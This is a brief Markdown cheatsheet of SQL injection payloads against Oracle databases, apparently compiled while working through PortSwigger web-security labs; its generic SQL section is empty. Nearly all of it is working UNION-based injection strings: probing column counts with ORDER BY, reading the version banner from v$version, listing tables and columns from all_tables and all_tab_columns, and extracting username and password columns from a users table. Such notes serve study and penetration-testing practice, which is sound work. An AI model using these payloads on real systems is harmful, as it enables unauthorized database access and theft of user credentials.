# SQL Injection Cheatsheets

## SQL Database




## ORACLE Database
- Identifying number of columns avaliable to craft the union select command [Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
```bash
Pets' order by 1--    # Increase the number starting from 1 to so on, when ever you get the 500 error then n-1 columns are their
# Asume here 2 cloumns, when i use the number 3 error of 500 internal server error
Pets'union select null, null from DUAL--     # DUALinternal table in ORACLE
Pets'union select 'a', 'a' from DUAL--
```
- Version
```bash
Pets'union select null, banner from v$version--
```
- List of Tables
```bash
' union select table_name from all_tables--  # It will provide the table names check for user keywords
```
- Data of tables
```bash
Pets'union select column_name null from+all_tab_columns where table_name = 'USERS_BPAWFN'--    # FInding column names
Pets'union select USERNAME_RABKTC,PASSWORD_YOEYVJ from+USERS_BPAWFN--
```
  
